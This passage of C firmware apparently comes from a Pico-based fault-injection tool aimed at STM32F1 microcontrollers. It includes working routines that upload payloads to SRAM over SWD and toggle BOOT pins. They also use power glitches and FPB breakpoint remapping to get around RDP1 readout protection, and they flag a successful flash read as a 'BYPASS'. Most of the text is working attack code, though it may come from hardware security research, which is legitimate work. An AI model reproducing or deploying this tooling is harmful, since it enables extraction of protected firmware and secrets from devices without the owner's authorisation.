    uart_cli_printf("  FLASH_ACR    (0x40022000) = 0x%08lX  LATENCY=%lu PRFTBE=%lu PRFTBS=%lu\r\n",
                    val, val & 7, (val >> 4) & 1, (val >> 5) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_SR     (0x4002200C) = 0x%08lX  BSY=%lu PGERR=%lu WRPRTERR=%lu EOP=%lu\r\n",
                    val, val & 1, (val >> 2) & 1, (val >> 4) & 1, (val >> 5) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_CR     (0x40022010) = 0x%08lX  LOCK=%lu", val, (val >> 7) & 1);
    if (val & 1) uart_cli_send(" PG");
    if (val & 2) uart_cli_send(" PER");
    if (val & 4) uart_cli_send(" MER");
    if (val & 0x10) uart_cli_send(" OPTPG");
    if (val & 0x20) uart_cli_send(" OPTER");
    uart_cli_send("\r\n");

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_OBR    (0x4002201C) = 0x%08lX  *** RDPRT=%lu ***", val, (val >> 1) & 1);
    if (val & 1) uart_cli_send(" OPTERR");
    uart_cli_printf("  Data0=0x%02lX Data1=0x%02lX\r\n", (val >> 10) & 0xFF, (val >> 18) & 0xFF);

    RDR_READ_WORD(val);
    uart_cli_printf("  FLASH_WRPR   (0x40022020) = 0x%08lX\r\n", val);

    RDR_READ_WORD(val);
    uart_cli_printf("  FP_CTRL      (0xE0002000) = 0x%08lX  ENABLE=%lu\r\n", val, val & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  DWT_CTRL     (0xE0001000) = 0x%08lX\r\n", val);

    RDR_READ_WORD(val);
    uart_cli_printf("  SCB_AIRCR    (0xE000ED0C) = 0x%08lX  VECTKEY=0x%03lX\r\n",
                    val, (val >> 16) & 0xFFFF);

    RDR_READ_WORD(val);
    uart_cli_printf("  SCB_SCR      (0xE000ED10) = 0x%08lX\r\n", val);

    RDR_READ_WORD(val);
    uart_cli_printf("  AFIO_MAPR    (0x40010004) = 0x%08lX  SWJ_CFG=%lu\r\n",
                    val, (val >> 24) & 7);

    RDR_READ_WORD(val);
    uart_cli_printf("  RCC_CR       (0x40021000) = 0x%08lX  HSION=%lu HSIRDY=%lu HSEON=%lu HSERDY=%lu PLLON=%lu\r\n",
                    val, val & 1, (val >> 1) & 1, (val >> 16) & 1, (val >> 17) & 1, (val >> 24) & 1);

    RDR_READ_WORD(val);
    uart_cli_printf("  RCC_CSR      (0x40021024) = 0x%08lX ", val);
    if (val & (1 << 26)) uart_cli_send("PIN_RST ");
    if (val & (1 << 27)) uart_cli_send("POR ");
    if (val & (1 << 28)) uart_cli_send("SW_RST ");
    if (val & (1 << 29)) uart_cli_send("IWDG ");
    if (val & (1 << 30)) uart_cli_send("WWDG ");
    if (val & (1 << 31)) uart_cli_send("LPWR ");
    uart_cli_send("\r\n");

    RDR_READ_WORD(val);
    uart_cli_printf("  CPUID        (0xE000ED00) = 0x%08lX", val);
    uint8_t impl = (val >> 24) & 0xFF;
    uint16_t partno = (val >> 4) & 0xFFF;
    if (impl == 0x41 && partno == 0xC23)
        uart_cli_printf("  Cortex-M3 r%lup%lu", (val >> 20) & 0xF, val & 0xF);
    uart_cli_send("\r\n");

    uart_cli_send("=====================\r\n");

    // Flash read tests
    uart_cli_send("\r\n=== FLASH READ TESTS ===\r\n");
    struct {
        const char *name;
        uint32_t addr;
    } flash_tests[] = {
        {"Flash base     ", 0x08000000},
        {"Reset vector   ", 0x08000004},
        {"Option bytes   ", 0x1FFFF800},
        {"OB USER/nUSER  ", 0x1FFFF802},
        {"Flash size reg ", 0x1FFFF7E0},
    };

    for (int t = 0; t < 5; t++) {
        uint64_t t0 = time_us_64();
        while (!uart_is_readable(TARGET_UART_ID)) {
            if (time_us_64() - t0 > RDR_BYTE_TIMEOUT_US) {
                uart_cli_printf("  %s (0x%08lX): TIMEOUT\r\n", flash_tests[t].name, flash_tests[t].addr);
                goto rdr_done;
            }
        }
        uint8_t status = uart_getc(TARGET_UART_ID);
        uint32_t data;
        RDR_READ_WORD(data);

        if (status == 'O') {
            uart_cli_printf("  %s (0x%08lX): OK    0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else if (status == 'F') {
            uart_cli_printf("  %s (0x%08lX): FAULT (PC=0x%08lX)\r\n",
                           flash_tests[t].name, flash_tests[t].addr, data);
        } else {
            uart_cli_printf("  %s (0x%08lX): ??? status=0x%02X data=0x%08lX\r\n",
                           flash_tests[t].name, flash_tests[t].addr, status, data);
        }
    }

rdr_done:
    // Check for "DONE"
    {
        char done_buf[4] = {0};
        bool got_done = true;
        for (int i = 0; i < 4; i++) {
            uint64_t t0 = time_us_64();
            while (!uart_is_readable(TARGET_UART_ID)) {
                if (time_us_64() - t0 > RDR_BYTE_TIMEOUT_US) { got_done = false; break; }
            }
            if (!got_done) break;
            done_buf[i] = uart_getc(TARGET_UART_ID);
        }
        if (got_done && memcmp(done_buf, "DONE", 4) == 0)
            uart_cli_send("\r\n=== COMPLETE ===\r\n");
        else
            uart_cli_send("\r\n=== INCOMPLETE ===\r\n");
    }

    #undef RDR_READ_WORD
    return true;
}

void target_power_glitch_regdump(uint32_t max_attempts) {
    extern bool swd_connect(void);
    extern bool swd_halt(void);
    extern bool swd_resume(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    if (!sweep_calibrated) {
        uart_cli_send("No sweep calibration — running SWEEP first...\r\n\r\n");
        target_power_sweep();
        if (!sweep_calibrated) {
            uart_cli_send("ERROR: Sweep failed to find optimal threshold\r\n");
            return;
        }
        uart_cli_send("\r\nSweep complete, continuing with GLITCH_REGDUMP...\r\n\r\n");
    }

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_regdump_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3D4 + 1;

    uart_cli_printf("RDP1 GLITCH REGDUMP: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_regdump_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);
    uart_cli_printf("Sweep calibrated threshold: %.2fV\r\n", sweep_optimal_thresh);

    // === Step 1: Upload regdump payload to SRAM via SWD ===
    uart_cli_send("\r\n[1] Uploading regdump payload to SRAM...\r\n");
    swd_init();
    if (!swd_connect()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect failed\r\n");
        return;
    }
    swd_halt();

    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_regdump_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_regdump_payload, sizeof(rdp_regdump_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    swd_resume();
    swd_deinit();

    // === Step 2: Set BOOT0=1, BOOT1=1 for SRAM boot mode ===
    uart_cli_send("[2] Setting BOOT0=HIGH, BOOT1=HIGH (SRAM boot mode)\r\n");
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 1);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 1);

    // === Step 3: Power glitch to trigger POR — stage 1 runs from SRAM ===
    float thresh_v = sweep_optimal_thresh;
    uart_cli_printf("[3] Power glitch for POR (threshold: %.2fV, max %lu attempts)...\r\n",
                    thresh_v, max_attempts);

    gpio_set_mask(POWER_MASK);
    sleep_ms(50);

    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    adc_power_init();
    uint32_t thresh = (uint32_t)(thresh_v / 3.3f * 4095.0f);

    bool stage1_ok = false;
    glitch_result_t gr;

    for (uint32_t attempt = 1; attempt <= max_attempts; attempt++) {
        nrst_irq_arm();

        gpio_set_dir(POWER_PIN2, GPIO_IN);
        gpio_set_dir(POWER_PIN3, GPIO_IN);
        gpio_disable_pulls(POWER_PIN2);
        gpio_disable_pulls(POWER_PIN3);

        adc_select_input(ADC_POWER_CHAN);
        gr.vmin_raw = 4095;
        gr.nrst_went_low = false;
        gr.thresh_reached = true;

        uint64_t t0 = time_us_64();
        gpio_clr_mask(1u << POWER_PIN1);

        while (true) {
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
            if (val <= thresh) break;
            if (time_us_64() - t0 > 500000) { gr.thresh_reached = false; break; }
        }

        if (gr.thresh_reached) {
            sleep_us(50);
            uint16_t val = adc_read();
            if (val < gr.vmin_raw) gr.vmin_raw = val;
        }

        gpio_set_dir(POWER_PIN2, GPIO_OUT);
        gpio_set_dir(POWER_PIN3, GPIO_OUT);
        gpio_set_mask(POWER_MASK);
        gr.glitch_us = (uint32_t)(time_us_64() - t0);

        for (int i = 0; i < 5000; i++) {
            if (!gpio_get(reset_pin)) { gr.nrst_went_low = true; break; }
            sleep_us(10);
        }
        nrst_irq_disarm();
        if (!gr.nrst_went_low && nrst_irq_fired) gr.nrst_went_low = true;

        float vmin = gr.vmin_raw * 3.3f / 4095.0f;
        uart_cli_printf("  [%lu] Vmin=%.2fV glitch=%luus nRST=%s\r\n",
                        attempt, vmin, gr.glitch_us,
                        gr.nrst_went_low ? "LOW" : "high");

        if (gr.nrst_went_low) {
            uart_cli_send("    POR triggered — stage 1 configuring FPB...\r\n");
            stage1_ok = true;
            break;
        }

        gpio_set_mask(POWER_MASK);
        sleep_ms(200);
    }

    gpio_set_mask(POWER_MASK);

    if (!stage1_ok) {
        uart_cli_send("\r\nFAILED: Could not trigger POR for stage 1\r\n");
        gpio_put(BOOT0_PIN, 0);
        gpio_put(BOOT1_PIN, 0);
        return;
    }

    // Wait for stage 1 to complete (FPB config + STOP/wake + UART report)
    uart_cli_send("    Waiting for stage 1 to complete...\r\n");
    sleep_ms(500);

    // === Step 4: Init UART ===
    uart_cli_send("[4] Initializing UART RX...\r\n");
    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    // === Step 5: Set BOOT0=0, pulse nRST — flash boot with FPB redirect to stage 2 ===
    uart_cli_send("[5] Setting BOOT0=LOW (flash boot), pulsing nRST...\r\n");
    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
    sleep_ms(10);

    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    // === Step 6: Receive regdump results ===
    uart_cli_send("[6] Receiving register dump...\r\n");
    receive_regdump_results();

    uart_cli_send("[7] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);

    gpio_put(BOOT0_PIN, 0);
    gpio_put(BOOT1_PIN, 0);
}

void target_power_resettest(void) {
    extern bool swd_connect_under_reset(void);
    extern void swd_init(void);
    extern void swd_deinit(void);
    extern uint32_t swd_write_mem(uint32_t addr, const uint32_t *data, uint32_t count);
    extern uint32_t swd_read_mem(uint32_t addr, uint32_t *data, uint32_t count);
    extern bool swd_write_core_reg(uint8_t reg, uint32_t value);

    const stm32_target_info_t *info = ensure_target_type();
    if (!info)
        return;

    uint32_t sram_base = info->sram_base;
    uint32_t payload_words = (sizeof(rdp_resettest_payload) + 3) / 4;
    const uint32_t stage2_thumb_addr = sram_base + 0x3EC + 1;

    uart_cli_printf("RDP1 RESET TEST: %u byte payload -> 0x%08lX\r\n",
                    (unsigned)sizeof(rdp_resettest_payload), sram_base);
    uart_cli_printf("Stage 2 entry: 0x%08lX\r\n", stage2_thumb_addr);

    uart_cli_send("\r\n[1] Connecting under reset...\r\n");
    swd_init();

    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    if (!swd_connect_under_reset()) {
        swd_deinit();
        uart_cli_send("ERROR: SWD connect under reset failed\r\n");
        return;
    }
    uart_cli_send("    Connected, core halted under reset\r\n");

    uart_cli_send("[2] Clearing BKP_DR1 (phase counter)...\r\n");
    uint32_t apb1enr;
    swd_read_mem(0x4002101C, &apb1enr, 1);
    apb1enr |= 0x18000000;
    swd_write_mem(0x4002101C, &apb1enr, 1);
    uint32_t pwr_cr;
    swd_read_mem(0x40007000, &pwr_cr, 1);
    pwr_cr |= 0x100;
    swd_write_mem(0x40007000, &pwr_cr, 1);
    sleep_ms(5);
    uint32_t zero = 0;
    swd_write_mem(0x40006C04, &zero, 1);

    uart_cli_send("[3] Uploading resettest payload to SRAM...\r\n");
    uint32_t written = swd_write_mem(sram_base, (const uint32_t *)rdp_resettest_payload, payload_words);
    if (written != payload_words) {
        uart_cli_printf("ERROR: SRAM write failed (%lu/%lu words)\r\n", written, payload_words);
        swd_deinit();
        return;
    }

    uint32_t readback[payload_words];
    uint32_t nread = swd_read_mem(sram_base, readback, payload_words);
    if (nread != payload_words || memcmp(readback, rdp_resettest_payload, sizeof(rdp_resettest_payload)) != 0) {
        uart_cli_send("ERROR: SRAM verify failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Payload uploaded and verified\r\n");

    uart_cli_send("[4] Configuring FPB via SWD...\r\n");
    uint32_t remap_val = stage2_thumb_addr;
    swd_write_mem(sram_base + 0x20, &remap_val, 1);
    uint32_t fp_ctrl = 0x03;
    swd_write_mem(0xE0002000, &fp_ctrl, 1);
    uint32_t fp_remap = 0x20000020;
    swd_write_mem(0xE0002004, &fp_remap, 1);
    uint32_t fp_comp0 = 0x05;
    swd_write_mem(0xE0002008, &fp_comp0, 1);

    uint32_t verify_val;
    swd_read_mem(0xE0002000, &verify_val, 1);
    uart_cli_printf("    FP_CTRL:  0x%08lX\r\n", verify_val);

    uint32_t demcr_val = 0;
    swd_write_mem(0xE000EDFC, &demcr_val, 1);

    uart_cli_send("[5] Running stage 1 (STOP/wake debug kill)...\r\n");
    uint32_t stage1_addr = sram_base + 0x200 + 1;
    swd_write_core_reg(13, 0x20005000);
    swd_write_core_reg(15, stage1_addr);

    uart_deinit(TARGET_UART_ID);
    gpio_deinit(TARGET_UART_RX_PIN);
    gpio_init(TARGET_UART_RX_PIN);
    uart_init(TARGET_UART_ID, 115200);
    uart_set_format(TARGET_UART_ID, 8, 1, UART_PARITY_NONE);
    gpio_set_function(TARGET_UART_RX_PIN, GPIO_FUNC_UART);

    uint32_t dhcsr_val;
    dhcsr_val = 0xA05F0003;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0001;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    dhcsr_val = 0xA05F0000;
    swd_write_mem(0xE000EDF0, &dhcsr_val, 1);
    swd_deinit();

    sleep_ms(200);
    uart_cli_send("    Stage 1 report: ");
    int s1_chars = 0;
    while (uart_is_readable(TARGET_UART_ID) && s1_chars < 20) {
        uint8_t c = uart_getc(TARGET_UART_ID);
        uart_cli_printf("%02X ", c);
        s1_chars++;
    }
    if (s1_chars == 0) uart_cli_send("(nothing received)");
    uart_cli_send("\r\n");

    uart_cli_send("[6] Pulsing nRST (flash boot with FPB redirect)...\r\n");
    while (uart_is_readable(TARGET_UART_ID))
        uart_getc(TARGET_UART_ID);

    uint8_t reset_pin = 15;
    gpio_init(reset_pin);
    gpio_set_dir(reset_pin, GPIO_OUT);
    gpio_put(reset_pin, 0);
    sleep_ms(10);
    gpio_put(reset_pin, 1);
    gpio_set_dir(reset_pin, GPIO_IN);
    gpio_pull_up(reset_pin);

    uart_cli_send("[7] Receiving test results...\r\n");
    const char *phase_names[] = {
        "Baseline + STOP cycling",
        "Post-IWDG reset",
        "Post-WWDG reset",
        "Post-STANDBY wakeup",
    };
    /* RCC_CSR bits 24-31: LPWR(24), ?(25), PIN(26), POR(27), SFT(28), IWDG(29), WWDG(30), LPWR2(31) */
    const char *reset_flag_names[] = {
        "LPWR", "?25", "PIN", "POR", "SFT", "IWDG", "WWDG", "LPWR2"
    };

    /* Helper: read one byte with timeout, returns -1 on timeout */
    #define READ_BYTE(dst, timeout_us) do { \
        uint64_t _dl = time_us_64() + (timeout_us); \
        int _got = 0; \
        while (time_us_64() < _dl) { \
            if (uart_is_readable(TARGET_UART_ID)) { \
                (dst) = uart_getc(TARGET_UART_ID); \
                _got = 1; break; \
            } \
        } \
        if (!_got) { uart_cli_send("  (byte timeout)\r\n"); goto resettest_done; } \
    } while(0)

    #define READ_WORD(dst, timeout_us) do { \
        (dst) = 0; \
        for (int _i = 0; _i < 4; _i++) { \
            uint8_t _b; READ_BYTE(_b, (timeout_us)); \
            (dst) |= ((uint32_t)_b) << (_i * 8); \
        } \
    } while(0)

    uint64_t total_start = time_us_64();
    bool done = false;

    while (!done && (time_us_64() - total_start) < 30000000) {
        /* Wait for "RST1" header */
        uint8_t hdr_state = 0;
        const char *hdr_str = "RST1";
        uint64_t phase_start = time_us_64();
        bool hdr_found = false;

        while (!hdr_found && (time_us_64() - phase_start) < 5000000) {
            if (uart_is_readable(TARGET_UART_ID)) {
                uint8_t c = uart_getc(TARGET_UART_ID);
                if (c == hdr_str[hdr_state]) {
                    hdr_state++;
                    if (hdr_state == 4) hdr_found = true;
                } else {
                    hdr_state = (c == 'R') ? 1 : 0;
                }
            }
        }

        if (!hdr_found) {
            uart_cli_send("    No RST1 header received\r\n");
            break;
        }

        uint8_t phase;
        READ_BYTE(phase, 500000);
        const char *pname = (phase < 4) ? phase_names[phase] : "Unknown";
        uart_cli_printf("\r\n=== Phase %u: %s ===\r\n", phase, pname);

        uint32_t rcc_csr;
        READ_WORD(rcc_csr, 500000);
        uart_cli_printf("  RCC_CSR: 0x%08lX (", rcc_csr);
        for (int i = 0; i < 8; i++) {
            if (rcc_csr & (1u << (24 + i)))
                uart_cli_printf("%s ", reset_flag_names[i]);
        }
        uart_cli_send(")\r\n");

        /* Flash test result: 'O'+data or 'F'+PC */
        uint8_t status;
        READ_BYTE(status, 2000000);
        uint32_t flash_val;
        READ_WORD(flash_val, 500000);

        if (status == 'O') {
            uart_cli_printf("  Flash 0x08000000: OK  0x%08lX", flash_val);
            if (flash_val == 0xCAFEF00D)
                uart_cli_send(" *** BYPASS! ***");
            uart_cli_send("\r\n");
        } else if (status == 'F') {
            uart_cli_printf("  Flash 0x08000000: FAULT (PC=0x%08lX)\r\n", flash_val);
        } else {
            uart_cli_printf("  Flash test: unexpected 0x%02X val=0x%08lX\r\n", status, flash_val);
        }

        /* Trailer: 'C'=cycling, 'N'=next reset, 'D'=done */
        uint8_t trailer;
        READ_BYTE(trailer, 5000000);

        if (trailer == 'C') {
            uart_cli_send("  STOP cycling...\r\n");
            /* Wait for 'T' (cycling done) */
            uint8_t t;
            READ_BYTE(t, 10000000);
            if (t == 'T') {
                /* Post-cycling flash test */
                READ_BYTE(status, 2000000);
                READ_WORD(flash_val, 500000);
                if (status == 'O') {
                    uart_cli_printf("  Post-STOP flash: OK  0x%08lX", flash_val);
                    if (flash_val == 0xCAFEF00D)
                        uart_cli_send(" *** BYPASS! ***");
                    uart_cli_send("\r\n");
                } else if (status == 'F') {
                    uart_cli_printf("  Post-STOP flash: FAULT (PC=0x%08lX)\r\n", flash_val);
                } else {
                    uart_cli_printf("  Post-STOP flash: unexpected 0x%02X\r\n", status);
                }
                READ_BYTE(trailer, 2000000);
            } else {
                uart_cli_printf("  Expected 'T', got 0x%02X\r\n", t);
                break;
            }
        }

        if (trailer == 'N') {
            uart_cli_send("  -> Next reset...\r\n");
            sleep_ms(200);
        } else if (trailer == 'D') {
            /* Read "ONE" after 'D' */
            uint8_t o, n, e;
            READ_BYTE(o, 500000);
            READ_BYTE(n, 500000);
            READ_BYTE(e, 500000);
            uart_cli_send("\r\n=== ALL PHASES COMPLETE ===\r\n");
            done = true;
        } else {
            uart_cli_printf("  Unexpected trailer: 0x%02X\r\n", trailer);
            break;
        }
    }

    if (!done)
        uart_cli_send("\r\n=== TEST COMPLETE (STANDBY phase lost SRAM — expected) ===\r\n");

    #undef READ_BYTE
    #undef READ_WORD

resettest_done:

    /* Post-STANDBY SWD-only flash probe. Bypasses the SRAM-payload
     * limitation: by the time we reach here the chip has gone through
     * STOP cycling + IWDG reset + WWDG reset + (attempted) STANDBY, and
     * the RTC alarm should have woken it back up. If STANDBY exit
     * actually disrupts the flash controller's RDP latch, AHB-AP reads
     * of 0x08000000 will return real flash content. If RDP is re-applied
     * by the wake reset (theory's prediction), the read faults or
     * returns zero. */
    uart_cli_send("\r\n[8] Post-STANDBY SWD probe of flash 0x08000000...\r\n");
    sleep_ms(200);  /* Let any in-flight wake settle */

    swd_init();
    if (!swd_connect_under_reset()) {
        uart_cli_send("    SWD reattach failed (chip in unresponsive state)\r\n");
        swd_deinit();
        goto probe_done;
    }
    uint32_t probe_val = 0xDEADBEEF;
    uint32_t got = swd_read_mem(0x08000000, &probe_val, 1);
    if (got != 1) {
        uart_cli_send("    Flash 0x08000000: FAULT (AHB-AP read rejected — RDP re-latched)\r\n");
    } else if (probe_val == 0 || probe_val == 0xFFFFFFFF) {
        uart_cli_printf("    Flash 0x08000000: 0x%08lX (likely RDP-masked)\r\n", probe_val);
    } else {
        uart_cli_printf("    Flash 0x08000000: 0x%08lX *** BYPASS — RDP NOT re-latched after STANDBY ***\r\n",
                        probe_val);
    }
    swd_deinit();

probe_done:
    uart_cli_send("[9] Power cycling target...\r\n");
    gpio_clr_mask(POWER_MASK);
    sleep_ms(100);
    gpio_set_mask(POWER_MASK);
}

// ============================================================
// TARGET GLITCH TIMING — DWT cycle counter + ADC shunt profile
// ============================================================

#define ADC_SHUNT_PIN   27  // GP27 = ADC1, shunt resistor on target VDD
#define ADC_SHUNT_CHAN  1

void target_power_timing(const char *name_or_addr, uint32_t samples, bool bootloader_mode) {
    // Ensure target type is set
    const stm32_target_info_t *info = ensure_target_type();
    if (!info) {
        uart_cli_send("ERROR: No STM32 target detected. Set with TARGET STM32F1\r\n");
        return;
    }

    const stm32_bp_table_t *table = stm32_get_breakpoints(target_get_type());

    // No args: list breakpoints
    if (!name_or_addr) {
        if (!table) {
            uart_cli_send("ERROR: No breakpoint table for this target\r\n");
            return;
        }
        uart_cli_printf("=== Breakpoint Table: %s (%u entries) ===\r\n", table->name, table->count);
        uart_cli_send("  NAME              ADDR        CATEGORY      DESCRIPTION\r\n");
        for (int i = 0; i < table->count; i++) {
            const stm32_bp_entry_t *e = &table->entries[i];
            uart_cli_printf("  %-16s  0x%08lX  %-12s  %s\r\n",
                            e->name, e->addr,
                            stm32_bp_category_name(e->category), e->desc);
        }
        uart_cli_send("\r\nUsage: TARGET GLITCH TIMING <name|0xADDR> [samples] [FLASH|BOOTLOADER]\r\n");
        return;
    }

    // Resolve breakpoint address
    uint32_t bp_addr = 0;
    const char *bp_name = NULL;
    const stm32_bp_entry_t *entry = NULL;

    if (name_or_addr[0] == '0' && (name_or_addr[1] == 'x' || name_or_addr[1] == 'X')) {
        bp_addr = strtoul(name_or_addr, NULL, 16);
        if (table)
            entry = stm32_find_breakpoint(table, name_or_addr);
        bp_name = entry ? entry->name : name_or_addr;
    } else {
        if (!table) {
            uart_cli_send("ERROR: No breakpoint table for this target\r\n");
            return;
        }
        entry = stm32_find_breakpoint(table, name_or_addr);
        if (!entry) {
            uart_cli_printf("ERROR: Unknown breakpoint '%s'. Run TIMING with no args to list.\r\n", name_or_addr);
            return;
        }
        bp_addr = entry->addr;
        bp_name = entry->name;
    }

    if (bp_addr == 0) {
        uart_cli_send("ERROR: Invalid breakpoint address\r\n");
        return;
    }

    if (samples == 0) samples = 32768;
    if (samples > 32768) samples = 32768;

    uart_cli_printf("\r\n=== TIMING: %s (0x%08lX) ===\r\n", bp_name, bp_addr);
    uart_cli_printf("Boot mode: %s (BOOT0=%u)\r\n",
                    bootloader_mode ? "BOOTLOADER" : "FLASH",
                    bootloader_mode ? 1 : 0);
    if (entry)
        uart_cli_printf("Category: %s — %s\r\n", stm32_bp_category_name(entry->category), entry->desc);

    // === Step 1: Set BOOT0 pin ===
    uart_cli_send("[1] Configuring BOOT pins...\r\n");
    gpio_init(BOOT0_PIN);
    gpio_set_dir(BOOT0_PIN, GPIO_OUT);
    gpio_put(BOOT0_PIN, bootloader_mode ? 1 : 0);
    gpio_init(BOOT1_PIN);
    gpio_set_dir(BOOT1_PIN, GPIO_OUT);
    gpio_put(BOOT1_PIN, 0);

    // === Step 2: Connect under reset (halts at reset vector via VC_CORERESET) ===
    uart_cli_send("[2] Connect under reset...\r\n");
    swd_init();
    if (!swd_connect_under_reset()) {
        uart_cli_send("ERROR: Connect under reset failed\r\n");
        swd_deinit();
        return;
    }
    uart_cli_send("    Core halted at reset vector\r\n");

    // Verify initial halt state — read PC and vector table
    {
        // Debug: check DHCSR S_REGRDY and DCRDR before/after DCRSR write
        uint32_t dhcsr_before, dcrdr_before, dcrdr_after;
        swd_read_mem(DHCSR, &dhcsr_before, 1);
        swd_read_mem(0xE000EDF8, &dcrdr_before, 1);  // DCRDR
        uart_cli_printf("    Pre-reg: DHCSR=0x%08lX DCRDR=0x%08lX\r\n",
                        dhcsr_before, dcrdr_before);

        uint32_t pc_init;
        bool ok = swd_read_core_reg(15, &pc_init);
        swd_read_mem(0xE000EDF8, &dcrdr_after, 1);
        uart_cli_printf("    Post-reg: ok=%d PC=0x%08lX DCRDR=0x%08lX\r\n",
                        ok, pc_init, dcrdr_after);

        uint32_t vtor[2];
        swd_read_mem(0x1FFFF000, vtor, 2);
        uart_cli_printf("    VT[SP]=0x%08lX VT[Reset]=0x%08lX\r\n", vtor[0], vtor[1]);
    }

    // === Step 3: Configure DWT + FPB while core is halted ===
    // Core is halted at reset vector via VC_CORERESET. FPB/DWT/DEMCR are all
    // in the debug power domain and survive nRST (only POR clears them).
    uart_cli_send("[3] Configuring DWT + FPB...\r\n");
    uint32_t zero = 0;

    // DEMCR: keep VC_CORERESET to re-catch core after watchdog reset,
    // plus TRCENA (DWT) and VC_HARDERR (catch hard faults)
    uint32_t demcr_val = (1u << 24) | (1u << 10) | (1u << 0);  // TRCENA | VC_HARDERR | VC_CORERESET
    swd_write_mem(DEMCR, &demcr_val, 1);

    // DWT_CTRL.CYCCNTENA = 1
    uint32_t dwt_ctrl = 1;
    swd_write_mem(0xE0001000, &dwt_ctrl, 1);

    // Zero cycle counter
    swd_write_mem(0xE0001004, &zero, 1);

    // STM32F1 boot ROM is on a dedicated bus that bypasses FPB/DWT instruction
    // matching. Instead use DWT data watchpoint on a peripheral register that the
    // boot ROM reads at the point of interest.
    //
    // Strategy: watch for reads of FLASH_OBR (0x4002201C) — the RDP status register.
    // The boot ROM reads this to decide if readout protection is active.
    // DWT data read watchpoint works on the system bus (D-code), not I-code.
    //
    // For non-RDP breakpoints, fall back to watching a known data access near the
    // target address. For now, always watch FLASH_OBR as primary strategy.

    // DWT data watchpoint: try RCC_CR write (0x40021000) — bootloader writes this early
    // If boot ROM bypasses DWT for reads, try writes to peripherals instead
    uint32_t watch_addr = 0x40021000;  // RCC_CR (clock control)
    swd_write_mem(0xE0001020, &watch_addr, 1);  // DWT_COMP0
    swd_write_mem(0xE0001024, &zero, 1);         // DWT_MASK0 = 0 (exact)
    // DWT_FUNCTION0 = 0x7: data address read/write watchpoint
    uint32_t dwt_func = 0x7;  // Data address read OR write
    swd_write_mem(0xE0001028, &dwt_func, 1);

    // Freeze IWDG/WWDG in debug halt (DBGMCU_CR)
    {
        uint32_t dbg_cr;
        swd_read_mem(0xE0042004, &dbg_cr, 1);
        dbg_cr |= (1u << 8) | (1u << 9);  // IWDG_STOP | WWDG_STOP
        swd_write_mem(0xE0042004, &dbg_cr, 1);
    }

    // Verify
    uint32_t v_dwt_comp, v_dwt_func;
    swd_read_mem(0xE0001020, &v_dwt_comp, 1);
    swd_read_mem(0xE0001028, &v_dwt_func, 1);
    uart_cli_printf("    DWT data watchpoint: COMP0=0x%08lX FUNC0=0x%08lX\r\n",
                    v_dwt_comp, v_dwt_func);

    // === Step 4: Two-stage boot: let watchdog fire, then measure second boot ===
    // Stage A: Resume with VC_CORERESET to survive the watchdog reset
    uart_cli_send("[4a] First boot (absorb watchdog)...\r\n");
    swd_write_mem(0xE0001004, &zero, 1);  // Zero CYCCNT
    swd_resume();

    // Wait for watchdog reset + VC_CORERESET re-halt
    uint32_t dhcsr_poll = 0;
    bool stage_a_ok = false;
    for (int i = 0; i < 500; i++) {  // 500ms max
        swd_read_mem(DHCSR, &dhcsr_poll, 1);
        if ((dhcsr_poll & (1u << 17)) && (dhcsr_poll & (1u << 25))) {
            // S_HALT + S_RESET_ST: caught after watchdog reset
            stage_a_ok = true;
            break;
        }
        sleep_ms(1);
    }

